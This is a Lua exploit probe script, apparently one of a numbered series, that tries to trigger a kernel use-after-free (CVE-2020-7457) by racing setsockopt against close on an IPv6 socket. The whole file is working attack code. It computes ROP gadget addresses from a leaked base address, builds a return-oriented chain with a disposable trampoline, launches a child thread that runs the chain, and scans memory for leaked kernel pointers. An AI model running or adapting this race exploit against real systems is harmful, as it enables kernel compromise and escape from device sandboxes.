-- CRASH_CLASS: MODERATE
-- PROBE 396a: IPv6 setsockopt close race
--
-- CVE-2020-7457: UAF in ip6_setpktopt when two threads race setsockopt
-- on the same socket. We can't call setsockopt from child (5 args, no pop_r8).
-- Instead: main thread loops setsockopt(IPV6_2292PKTOPTIONS), child loops
-- close(sock_fd). If close fires during setsockopt's kernel path, the
-- socket refcount may desync → UAF.
--
-- Also test: child re-creates socket via socket(AF_INET6, SOCK_DGRAM, 0)
-- after each close, so the fd number may be recycled. Main thread's next
-- setsockopt hits a different socket object at the same fd → type confusion.
--
-- Uses disposable trampoline pattern from 395g to handle stub error frames.

print("=== PROBE 396a: ipv6 race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local pop_rsp_ret = g(0x9A2)

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Create IPv6 UDP socket: socket(AF_INET6=28, SOCK_DGRAM=2, 0)
local ok_s, rv_s = pcall(function()
    return mk(97)(uint64(28), uint64(2), uint64(0))
end)
local sock_fd = ok_s and N(rv_s) or -1
print(string.format("sock=%d", sock_fd))
if sock_fd < 0 then print("socket FAIL"); return end

-- Test: setsockopt(sock, IPPROTO_IPV6=41, IPV6_2292PKTOPTIONS=25, buf, len)
-- First verify it works at all
local optbuf = memory.alloc(256)
for i = 0, 252, 4 do wd(N(optbuf) + i, 0) end
local ok_so, rv_so = pcall(function()
    return mk(105)(uint64(sock_fd), uint64(41), uint64(25), optbuf, uint64(64))
end)
local so_ret = ok_so and N(rv_so) or -999
print(string.format("setsockopt_test=%d", so_ret))

-- Shared memory for counters
local shared = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(shared) + i, 0) end
local marker_a = N(shared)
local counter_a = N(shared) + 8

-- Fake TCB (zeroed)
local tcb_buf = memory.alloc(0x10000)
for i = 0, 0xFFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x8000
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

-- Disposable trampoline (8KB, entry at +4KB)
local DISP_SIZE = 0x2000
local disp_buf = memory.alloc(DISP_SIZE)
for i = 0, DISP_SIZE - 4, 4 do wd(N(disp_buf) + i, 0) end
local disp_start = N(disp_buf) + 0x1000

-- Main chain stack
local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8

local sp = rsp
local function push(val) wq(sp, val); sp = sp + 8 end

-- ===== PREAMBLE =====
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- ===== LOOP: close(sock_fd) =====
local loop_addr = sp

-- Repair trampoline (3 writes × 5 qwords = 15 qwords)
push(pop_rdi_ret); push(uint64(disp_start))
push(pop_rax_ret); push(stub)
push(mov_rdi_rax)

push(pop_rdi_ret); push(uint64(disp_start + 8))
push(pop_rax_ret); push(pop_rsp_ret)
push(mov_rdi_rax)

-- chain_continue offset: 3 repairs (15) + syscall args (4) + jump (2) = 21 qwords = 168 bytes
local chain_continue = loop_addr + 168

push(pop_rdi_ret); push(uint64(disp_start + 16))
push(pop_rax_ret); push(uint64(chain_continue))
push(mov_rdi_rax)

-- close(sock_fd)
push(pop_rax_ret); push(uint64(6))
push(pop_rdi_ret); push(uint64(sock_fd))

-- Jump to trampoline
push(pop_rsp_ret); push(uint64(disp_start))

-- ===== CHAIN CONTINUE =====
if sp ~= chain_continue then
    print(string.format("ALIGN ERROR sp=%X expect=%X", sp, chain_continue))
    return
end

-- Write marker (confirms loop is running)
push(pop_rdi_ret); push(uint64(marker_a))
push(pop_rax_ret); push(uint64(0xCAFE))
push(mov_rdi_rax)

-- Increment counter via: read counter, add 1, write back
-- Can't do add in ROP easily. Instead write a constant to show loop ran.
-- Just overwrite with iteration evidence.

-- Loop back
push(pop_rsp_ret); push(uint64(loop_addr))

print(string.format("chain=%d bytes", sp - rsp))

-- Init trampoline
wq(disp_start, stub)
wq(disp_start + 8, pop_rsp_ret)
wq(disp_start + 16, uint64(chain_continue))

-- thr_param
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 8, 0, 0)
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
w64(N(pa) + 0x30, N(ctid) % 0x100000000, math.floor(N(ctid) / 0x100000000))

-- Launch child (loops close(sock_fd))
print("launch_child")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))
if tret ~= 0 then print("CHILD FAIL"); return end

-- Main thread: race setsockopt against child's close
-- IPV6_2292PKTOPTIONS = 25, IPPROTO_IPV6 = 41
-- Use varying option buffer sizes to increase kernel path diversity
local race_ok = 0
local race_fail = 0
local race_crash = 0

print("racing...")
for round = 1, 500 do
    -- Re-create socket if it was closed by child
    local test_ok, test_rv = pcall(function()
        return mk(105)(uint64(sock_fd), uint64(41), uint64(25), optbuf, uint64(0))
    end)
    local test_ret = test_ok and N(test_rv) or -999

    if test_ret == -999 then
        -- Socket gone, recreate at same fd (best effort)
        race_crash = race_crash + 1
        local new_ok, new_rv = pcall(function()
            return mk(97)(uint64(28), uint64(2), uint64(0))
        end)
        local new_fd = new_ok and N(new_rv) or -1
        if new_fd ~= sock_fd then
            -- fd number changed, close and retry
            if new_fd >= 0 then pcall(function() mk(6)(uint64(new_fd)) end) end
        end
    elseif test_ret == 0 then
        race_ok = race_ok + 1
    else
        race_fail = race_fail + 1
    end

    -- Try setsockopt with actual data
    -- Build a minimal IPv6 extension header option
    local optlen = 8 + (round % 32) * 4  -- vary size
    if optlen > 252 then optlen = 252 end
    local so_ok, so_rv = pcall(function()
        return mk(105)(uint64(sock_fd), uint64(41), uint64(25), optbuf, uint64(optlen))
    end)
    local so_r = so_ok and N(so_rv) or -999
    if so_r == -999 then
        race_crash = race_crash + 1
    elseif so_r == 0 then
        race_ok = race_ok + 1
    else
        race_fail = race_fail + 1
    end

    if not alive() then
        print(string.format("DEAD at round %d!", round))
        break
    end
end

print(string.format("ok=%d fail=%d crash=%d", race_ok, race_fail, race_crash))

-- Check child
local m = rd(marker_a)
print(string.format("marker=%04X", m or 0))

local tid_lo = rd(N(ctid))
if tid_lo and tid_lo > 0 then
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(tid_lo), uint64(0))
    end)
    print(string.format("child=%d (0=alive)", ok_k and N(rv_k) or -999))
end

-- Scan for kernel pointers in shared buffers
local function kptr_check(addr, len, label)
    for off = 0, len - 4, 4 do
        local d = rd(addr + off)
        if d and d >= 0xFFFF8000 then
            local lo = rd(addr + off - 4) or 0
            if lo ~= 0xFFFFFFFF then
                print(string.format("KPTR? %s+%X: %08X_%08X", label, off - 4, d, lo))
            end
        end
    end
end
kptr_check(N(optbuf), 256, "optbuf")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 396a COMPLETE ===")
